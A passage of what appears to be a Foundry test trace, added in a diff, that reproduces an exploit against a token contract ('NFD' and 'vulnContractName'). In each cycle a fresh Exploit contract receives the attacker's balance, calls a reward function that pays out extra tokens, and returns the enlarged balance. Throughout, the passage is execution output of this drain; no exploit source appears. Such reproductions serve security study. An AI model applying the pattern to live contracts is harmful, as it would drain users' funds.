+    │   │   │   ├─ [79852] NFD::transfer(Exploit: [0xA4AD4f68d0b91CFD19687c881e50f3A00242828c], 11046669517289307157913386 [1.104e25])
+    │   │   │   │   ├─ emit Transfer(from: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Exploit: [0xA4AD4f68d0b91CFD19687c881e50f3A00242828c], value: 11046669517289307157913300 [1.104e25])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [54308] Exploit::abuse()
+    │   │   │   │   ├─ [39161] vulnContractName::6811e3b9(00000000000000000000000000000000000000000000000000000000)
+    │   │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0xA4AD4f68d0b91CFD19687c881e50f3A00242828c]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 11046669517289307157913385 [1.104e25]
+    │   │   │   │   │   ├─ [10844] NFD::transfer(Exploit: [0xA4AD4f68d0b91CFD19687c881e50f3A00242828c], 919082903838470355538393 [9.19e23])
+    │   │   │   │   │   │   ├─ emit Transfer(from: vulnContractName: [0x8B068E22E9a4A9bcA3C321e0ec428AbF32691D1E], to: Exploit: [0xA4AD4f68d0b91CFD19687c881e50f3A00242828c], value: 919082903838470355538300 [9.19e23])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0xA4AD4f68d0b91CFD19687c881e50f3A00242828c]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 11965752421127777513451778 [1.196e25]
+    │   │   │   │   ├─ [10844] NFD::transfer(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 11965752421127777513451778 [1.196e25])
+    │   │   │   │   │   ├─ emit Transfer(from: Exploit: [0xA4AD4f68d0b91CFD19687c881e50f3A00242828c], to: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 11965752421127777513451700 [1.196e25])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ [836088] → new Exploit@0x03A6a84cD762D9707A21605b548aaaB891562aAb
+    │   │   │   │   └─ ← [Return] 3955 bytes of code
+    │   │   │   ├─ [2855] NFD::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 11965752421127777513451778 [1.196e25]
+    │   │   │   ├─ [79852] NFD::transfer(Exploit: [0x03A6a84cD762D9707A21605b548aaaB891562aAb], 11965752421127777513451778 [1.196e25])
+    │   │   │   │   ├─ emit Transfer(from: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Exploit: [0x03A6a84cD762D9707A21605b548aaaB891562aAb], value: 11965752421127777513451700 [1.196e25])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [54308] Exploit::abuse()
+    │   │   │   │   ├─ [39161] vulnContractName::6811e3b9(00000000000000000000000000000000000000000000000000000000)
+    │   │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0x03A6a84cD762D9707A21605b548aaaB891562aAb]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 11965752421127777513451777 [1.196e25]
+    │   │   │   │   │   ├─ [10844] NFD::transfer(Exploit: [0x03A6a84cD762D9707A21605b548aaaB891562aAb], 995550601437831089119187 [9.955e23])
+    │   │   │   │   │   │   ├─ emit Transfer(from: vulnContractName: [0x8B068E22E9a4A9bcA3C321e0ec428AbF32691D1E], to: Exploit: [0x03A6a84cD762D9707A21605b548aaaB891562aAb], value: 995550601437831089119100 [9.955e23])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0x03A6a84cD762D9707A21605b548aaaB891562aAb]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 12961303022565608602570964 [1.296e25]
+    │   │   │   │   ├─ [10844] NFD::transfer(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 12961303022565608602570964 [1.296e25])
+    │   │   │   │   │   ├─ emit Transfer(from: Exploit: [0x03A6a84cD762D9707A21605b548aaaB891562aAb], to: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 12961303022565608602570900 [1.296e25])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ [836088] → new Exploit@0xD6BbDE9174b1CdAa358d2Cf4D57D1a9F7178FBfF
+    │   │   │   │   └─ ← [Return] 3955 bytes of code
+    │   │   │   ├─ [2855] NFD::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 12961303022565608602570964 [1.296e25]
+    │   │   │   ├─ [79852] NFD::transfer(Exploit: [0xD6BbDE9174b1CdAa358d2Cf4D57D1a9F7178FBfF], 12961303022565608602570964 [1.296e25])
+    │   │   │   │   ├─ emit Transfer(from: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Exploit: [0xD6BbDE9174b1CdAa358d2Cf4D57D1a9F7178FBfF], value: 12961303022565608602570900 [1.296e25])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [54308] Exploit::abuse()
+    │   │   │   │   ├─ [39161] vulnContractName::6811e3b9(00000000000000000000000000000000000000000000000000000000)
+    │   │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0xD6BbDE9174b1CdAa358d2Cf4D57D1a9F7178FBfF]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 12961303022565608602570963 [1.296e25]
+    │   │   │   │   │   ├─ [10844] NFD::transfer(Exploit: [0xD6BbDE9174b1CdAa358d2Cf4D57D1a9F7178FBfF], 1078380411477458635733904 [1.078e24])
+    │   │   │   │   │   │   ├─ emit Transfer(from: vulnContractName: [0x8B068E22E9a4A9bcA3C321e0ec428AbF32691D1E], to: Exploit: [0xD6BbDE9174b1CdAa358d2Cf4D57D1a9F7178FBfF], value: 1078380411477458635733900 [1.078e24])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0xD6BbDE9174b1CdAa358d2Cf4D57D1a9F7178FBfF]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 14039683434043067238304867 [1.403e25]
+    │   │   │   │   ├─ [10844] NFD::transfer(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 14039683434043067238304867 [1.403e25])
+    │   │   │   │   │   ├─ emit Transfer(from: Exploit: [0xD6BbDE9174b1CdAa358d2Cf4D57D1a9F7178FBfF], to: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 14039683434043067238304800 [1.403e25])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ [836088] → new Exploit@0x15cF58144EF33af1e14b5208015d11F9143E27b9
+    │   │   │   │   └─ ← [Return] 3955 bytes of code
+    │   │   │   ├─ [2855] NFD::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 14039683434043067238304867 [1.403e25]
+    │   │   │   ├─ [79852] NFD::transfer(Exploit: [0x15cF58144EF33af1e14b5208015d11F9143E27b9], 14039683434043067238304867 [1.403e25])
+    │   │   │   │   ├─ emit Transfer(from: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Exploit: [0x15cF58144EF33af1e14b5208015d11F9143E27b9], value: 14039683434043067238304800 [1.403e25])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [54308] Exploit::abuse()
+    │   │   │   │   ├─ [39161] vulnContractName::6811e3b9(00000000000000000000000000000000000000000000000000000000)
+    │   │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0x15cF58144EF33af1e14b5208015d11F9143E27b9]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 14039683434043067238304866 [1.403e25]
+    │   │   │   │   │   ├─ [10844] NFD::transfer(Exploit: [0x15cF58144EF33af1e14b5208015d11F9143E27b9], 1168101661712383194226964 [1.168e24])
+    │   │   │   │   │   │   ├─ emit Transfer(from: vulnContractName: [0x8B068E22E9a4A9bcA3C321e0ec428AbF32691D1E], to: Exploit: [0x15cF58144EF33af1e14b5208015d11F9143E27b9], value: 1168101661712383194226900 [1.168e24])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0x15cF58144EF33af1e14b5208015d11F9143E27b9]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 15207785095755450432531830 [1.52e25]
+    │   │   │   │   ├─ [10844] NFD::transfer(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 15207785095755450432531830 [1.52e25])
+    │   │   │   │   │   ├─ emit Transfer(from: Exploit: [0x15cF58144EF33af1e14b5208015d11F9143E27b9], to: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 15207785095755450432531800 [1.52e25])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ [836088] → new Exploit@0x212224D2F2d262cd093eE13240ca4873fcCBbA3C
+    │   │   │   │   └─ ← [Return] 3955 bytes of code
+    │   │   │   ├─ [2855] NFD::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 15207785095755450432531830 [1.52e25]
+    │   │   │   ├─ [79852] NFD::transfer(Exploit: [0x212224D2F2d262cd093eE13240ca4873fcCBbA3C], 15207785095755450432531830 [1.52e25])
+    │   │   │   │   ├─ emit Transfer(from: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Exploit: [0x212224D2F2d262cd093eE13240ca4873fcCBbA3C], value: 15207785095755450432531800 [1.52e25])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [54308] Exploit::abuse()
+    │   │   │   │   ├─ [39161] vulnContractName::6811e3b9(00000000000000000000000000000000000000000000000000000000)
+    │   │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0x212224D2F2d262cd093eE13240ca4873fcCBbA3C]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 15207785095755450432531829 [1.52e25]
+    │   │   │   │   │   ├─ [10844] NFD::transfer(Exploit: [0x212224D2F2d262cd093eE13240ca4873fcCBbA3C], 1265287719966853475986648 [1.265e24])
+    │   │   │   │   │   │   ├─ emit Transfer(from: vulnContractName: [0x8B068E22E9a4A9bcA3C321e0ec428AbF32691D1E], to: Exploit: [0x212224D2F2d262cd093eE13240ca4873fcCBbA3C], value: 1265287719966853475986600 [1.265e24])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0x212224D2F2d262cd093eE13240ca4873fcCBbA3C]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 16473072815722303908518477 [1.647e25]
+    │   │   │   │   ├─ [10844] NFD::transfer(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 16473072815722303908518477 [1.647e25])
+    │   │   │   │   │   ├─ emit Transfer(from: Exploit: [0x212224D2F2d262cd093eE13240ca4873fcCBbA3C], to: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 16473072815722303908518400 [1.647e25])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ [836088] → new Exploit@0x2a07706473244BC757E10F2a9E86fB532828afe3
+    │   │   │   │   └─ ← [Return] 3955 bytes of code
+    │   │   │   ├─ [2855] NFD::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 16473072815722303908518477 [1.647e25]
+    │   │   │   ├─ [79852] NFD::transfer(Exploit: [0x2a07706473244BC757E10F2a9E86fB532828afe3], 16473072815722303908518477 [1.647e25])
+    │   │   │   │   ├─ emit Transfer(from: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Exploit: [0x2a07706473244BC757E10F2a9E86fB532828afe3], value: 16473072815722303908518400 [1.647e25])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [54308] Exploit::abuse()
+    │   │   │   │   ├─ [39161] vulnContractName::6811e3b9(00000000000000000000000000000000000000000000000000000000)
+    │   │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0x2a07706473244BC757E10F2a9E86fB532828afe3]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 16473072815722303908518476 [1.647e25]
+    │   │   │   │   │   ├─ [10844] NFD::transfer(Exploit: [0x2a07706473244BC757E10F2a9E86fB532828afe3], 1370559658268095685188737 [1.37e24])
+    │   │   │   │   │   │   ├─ emit Transfer(from: vulnContractName: [0x8B068E22E9a4A9bcA3C321e0ec428AbF32691D1E], to: Exploit: [0x2a07706473244BC757E10F2a9E86fB532828afe3], value: 1370559658268095685188700 [1.37e24])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0x2a07706473244BC757E10F2a9E86fB532828afe3]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 17843632473990399593707213 [1.784e25]
+    │   │   │   │   ├─ [10844] NFD::transfer(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 17843632473990399593707213 [1.784e25])
+    │   │   │   │   │   ├─ emit Transfer(from: Exploit: [0x2a07706473244BC757E10F2a9E86fB532828afe3], to: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 17843632473990399593707200 [1.784e25])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ [836088] → new Exploit@0x3D7Ebc40AF7092E3F1C81F2e996cbA5Cae2090d7
+    │   │   │   │   └─ ← [Return] 3955 bytes of code
+    │   │   │   ├─ [2855] NFD::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 17843632473990399593707213 [1.784e25]
+    │   │   │   ├─ [79852] NFD::transfer(Exploit: [0x3D7Ebc40AF7092E3F1C81F2e996cbA5Cae2090d7], 17843632473990399593707213 [1.784e25])
+    │   │   │   │   ├─ emit Transfer(from: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Exploit: [0x3D7Ebc40AF7092E3F1C81F2e996cbA5Cae2090d7], value: 17843632473990399593707200 [1.784e25])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [54308] Exploit::abuse()
+    │   │   │   │   ├─ [39161] vulnContractName::6811e3b9(00000000000000000000000000000000000000000000000000000000)
+    │   │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0x3D7Ebc40AF7092E3F1C81F2e996cbA5Cae2090d7]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 17843632473990399593707212 [1.784e25]
+    │   │   │   │   │   ├─ [10844] NFD::transfer(Exploit: [0x3D7Ebc40AF7092E3F1C81F2e996cbA5Cae2090d7], 1484590221836001246196440 [1.484e24])
+    │   │   │   │   │   │   ├─ emit Transfer(from: vulnContractName: [0x8B068E22E9a4A9bcA3C321e0ec428AbF32691D1E], to: Exploit: [0x3D7Ebc40AF7092E3F1C81F2e996cbA5Cae2090d7], value: 1484590221836001246196400 [1.484e24])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0x3D7Ebc40AF7092E3F1C81F2e996cbA5Cae2090d7]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 19328222695826400839903652 [1.932e25]
+    │   │   │   │   ├─ [10844] NFD::transfer(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 19328222695826400839903652 [1.932e25])
+    │   │   │   │   │   ├─ emit Transfer(from: Exploit: [0x3D7Ebc40AF7092E3F1C81F2e996cbA5Cae2090d7], to: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 19328222695826400839903600 [1.932e25])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ [836088] → new Exploit@0xD16d567549A2a2a2005aEACf7fB193851603dd70
+    │   │   │   │   └─ ← [Return] 3955 bytes of code
+    │   │   │   ├─ [2855] NFD::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 19328222695826400839903652 [1.932e25]
+    │   │   │   ├─ [79852] NFD::transfer(Exploit: [0xD16d567549A2a2a2005aEACf7fB193851603dd70], 19328222695826400839903652 [1.932e25])
+    │   │   │   │   ├─ emit Transfer(from: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Exploit: [0xD16d567549A2a2a2005aEACf7fB193851603dd70], value: 19328222695826400839903600 [1.932e25])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [54308] Exploit::abuse()
+    │   │   │   │   ├─ [39161] vulnContractName::6811e3b9(00000000000000000000000000000000000000000000000000000000)
+    │   │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0xD16d567549A2a2a2005aEACf7fB193851603dd70]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 19328222695826400839903651 [1.932e25]
+    │   │   │   │   │   ├─ [10844] NFD::transfer(Exploit: [0xD16d567549A2a2a2005aEACf7fB193851603dd70], 1608108128292756549879983 [1.608e24])
+    │   │   │   │   │   │   ├─ emit Transfer(from: vulnContractName: [0x8B068E22E9a4A9bcA3C321e0ec428AbF32691D1E], to: Exploit: [0xD16d567549A2a2a2005aEACf7fB193851603dd70], value: 1608108128292756549879900 [1.608e24])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0xD16d567549A2a2a2005aEACf7fB193851603dd70]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 20936330824119157389783634 [2.093e25]
+    │   │   │   │   ├─ [10844] NFD::transfer(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 20936330824119157389783634 [2.093e25])
+    │   │   │   │   │   ├─ emit Transfer(from: Exploit: [0xD16d567549A2a2a2005aEACf7fB193851603dd70], to: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 20936330824119157389783600 [2.093e25])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ [836088] → new Exploit@0x96d3F6c20EEd2697647F543fE6C08bC2Fbf39758
+    │   │   │   │   └─ ← [Return] 3955 bytes of code
+    │   │   │   ├─ [2855] NFD::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 20936330824119157389783634 [2.093e25]
+    │   │   │   ├─ [79852] NFD::transfer(Exploit: [0x96d3F6c20EEd2697647F543fE6C08bC2Fbf39758], 20936330824119157389783634 [2.093e25])
+    │   │   │   │   ├─ emit Transfer(from: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Exploit: [0x96d3F6c20EEd2697647F543fE6C08bC2Fbf39758], value: 20936330824119157389783600 [2.093e25])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [54308] Exploit::abuse()
+    │   │   │   │   ├─ [39161] vulnContractName::6811e3b9(00000000000000000000000000000000000000000000000000000000)
+    │   │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0x96d3F6c20EEd2697647F543fE6C08bC2Fbf39758]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 20936330824119157389783633 [2.093e25]
+    │   │   │   │   │   ├─ [10844] NFD::transfer(Exploit: [0x96d3F6c20EEd2697647F543fE6C08bC2Fbf39758], 1741902724566713894829998 [1.741e24])
+    │   │   │   │   │   │   ├─ emit Transfer(from: vulnContractName: [0x8B068E22E9a4A9bcA3C321e0ec428AbF32691D1E], to: Exploit: [0x96d3F6c20EEd2697647F543fE6C08bC2Fbf39758], value: 1741902724566713894829900 [1.741e24])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0x96d3F6c20EEd2697647F543fE6C08bC2Fbf39758]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 22678233548685871284613631 [2.267e25]
+    │   │   │   │   ├─ [10844] NFD::transfer(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 22678233548685871284613631 [2.267e25])
+    │   │   │   │   │   ├─ emit Transfer(from: Exploit: [0x96d3F6c20EEd2697647F543fE6C08bC2Fbf39758], to: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 22678233548685871284613600 [2.267e25])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ [836088] → new Exploit@0x13aa49bAc059d709dd0a18D6bb63290076a702D7
+    │   │   │   │   └─ ← [Return] 3955 bytes of code
+    │   │   │   ├─ [2855] NFD::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 22678233548685871284613631 [2.267e25]
+    │   │   │   ├─ [79852] NFD::transfer(Exploit: [0x13aa49bAc059d709dd0a18D6bb63290076a702D7], 22678233548685871284613631 [2.267e25])
+    │   │   │   │   ├─ emit Transfer(from: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Exploit: [0x13aa49bAc059d709dd0a18D6bb63290076a702D7], value: 22678233548685871284613600 [2.267e25])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [54308] Exploit::abuse()
+    │   │   │   │   ├─ [39161] vulnContractName::6811e3b9(00000000000000000000000000000000000000000000000000000000)
+    │   │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0x13aa49bAc059d709dd0a18D6bb63290076a702D7]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 22678233548685871284613630 [2.267e25]
+    │   │   │   │   │   ├─ [10844] NFD::transfer(Exploit: [0x13aa49bAc059d709dd0a18D6bb63290076a702D7], 1886829031250664490879854 [1.886e24])
+    │   │   │   │   │   │   ├─ emit Transfer(from: vulnContractName: [0x8B068E22E9a4A9bcA3C321e0ec428AbF32691D1E], to: Exploit: [0x13aa49bAc059d709dd0a18D6bb63290076a702D7], value: 1886829031250664490879800 [1.886e24])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0x13aa49bAc059d709dd0a18D6bb63290076a702D7]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 24565062579936535775493484 [2.456e25]
+    │   │   │   │   ├─ [10844] NFD::transfer(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 24565062579936535775493484 [2.456e25])
+    │   │   │   │   │   ├─ emit Transfer(from: Exploit: [0x13aa49bAc059d709dd0a18D6bb63290076a702D7], to: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 24565062579936535775493400 [2.456e25])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ [836088] → new Exploit@0xDB25A7b768311dE128BBDa7B8426c3f9C74f3240
+    │   │   │   │   └─ ← [Return] 3955 bytes of code
+    │   │   │   ├─ [2855] NFD::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 24565062579936535775493484 [2.456e25]
+    │   │   │   ├─ [79852] NFD::transfer(Exploit: [0xDB25A7b768311dE128BBDa7B8426c3f9C74f3240], 24565062579936535775493484 [2.456e25])
+    │   │   │   │   ├─ emit Transfer(from: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Exploit: [0xDB25A7b768311dE128BBDa7B8426c3f9C74f3240], value: 24565062579936535775493400 [2.456e25])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [54308] Exploit::abuse()
+    │   │   │   │   ├─ [39161] vulnContractName::6811e3b9(00000000000000000000000000000000000000000000000000000000)
+    │   │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0xDB25A7b768311dE128BBDa7B8426c3f9C74f3240]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 24565062579936535775493483 [2.456e25]
+    │   │   │   │   │   ├─ [10844] NFD::transfer(Exploit: [0xDB25A7b768311dE128BBDa7B8426c3f9C74f3240], 2043813206650719776521057 [2.043e24])
+    │   │   │   │   │   │   ├─ emit Transfer(from: vulnContractName: [0x8B068E22E9a4A9bcA3C321e0ec428AbF32691D1E], to: Exploit: [0xDB25A7b768311dE128BBDa7B8426c3f9C74f3240], value: 2043813206650719776521000 [2.043e24])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0xDB25A7b768311dE128BBDa7B8426c3f9C74f3240]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 26608875786587255552014540 [2.66e25]
+    │   │   │   │   ├─ [10844] NFD::transfer(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 26608875786587255552014540 [2.66e25])
+    │   │   │   │   │   ├─ emit Transfer(from: Exploit: [0xDB25A7b768311dE128BBDa7B8426c3f9C74f3240], to: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 26608875786587255552014500 [2.66e25])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ [836088] → new Exploit@0x3381cD18e2Fb4dB236BF0525938AB6E43Db0440f
+    │   │   │   │   └─ ← [Return] 3955 bytes of code
+    │   │   │   ├─ [2855] NFD::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 26608875786587255552014540 [2.66e25]
+    │   │   │   ├─ [79852] NFD::transfer(Exploit: [0x3381cD18e2Fb4dB236BF0525938AB6E43Db0440f], 26608875786587255552014540 [2.66e25])
+    │   │   │   │   ├─ emit Transfer(from: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Exploit: [0x3381cD18e2Fb4dB236BF0525938AB6E43Db0440f], value: 26608875786587255552014500 [2.66e25])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [54308] Exploit::abuse()
+    │   │   │   │   ├─ [39161] vulnContractName::6811e3b9(00000000000000000000000000000000000000000000000000000000)
+    │   │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0x3381cD18e2Fb4dB236BF0525938AB6E43Db0440f]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 26608875786587255552014539 [2.66e25]
+    │   │   │   │   │   ├─ [10844] NFD::transfer(Exploit: [0x3381cD18e2Fb4dB236BF0525938AB6E43Db0440f], 2213858465444059661927609 [2.213e24])
+    │   │   │   │   │   │   ├─ emit Transfer(from: vulnContractName: [0x8B068E22E9a4A9bcA3C321e0ec428AbF32691D1E], to: Exploit: [0x3381cD18e2Fb4dB236BF0525938AB6E43Db0440f], value: 2213858465444059661927600 [2.213e24])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0x3381cD18e2Fb4dB236BF0525938AB6E43Db0440f]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 28822734252031315213942148 [2.882e25]
+    │   │   │   │   ├─ [10844] NFD::transfer(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 28822734252031315213942148 [2.882e25])
+    │   │   │   │   │   ├─ emit Transfer(from: Exploit: [0x3381cD18e2Fb4dB236BF0525938AB6E43Db0440f], to: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 28822734252031315213942100 [2.882e25])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ [836088] → new Exploit@0x756e0562323ADcDA4430d6cb456d9151f605290B
+    │   │   │   │   └─ ← [Return] 3955 bytes of code
+    │   │   │   ├─ [2855] NFD::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 28822734252031315213942148 [2.882e25]
+    │   │   │   ├─ [79852] NFD::transfer(Exploit: [0x756e0562323ADcDA4430d6cb456d9151f605290B], 28822734252031315213942148 [2.882e25])
+    │   │   │   │   ├─ emit Transfer(from: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Exploit: [0x756e0562323ADcDA4430d6cb456d9151f605290B], value: 28822734252031315213942100 [2.882e25])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [54308] Exploit::abuse()
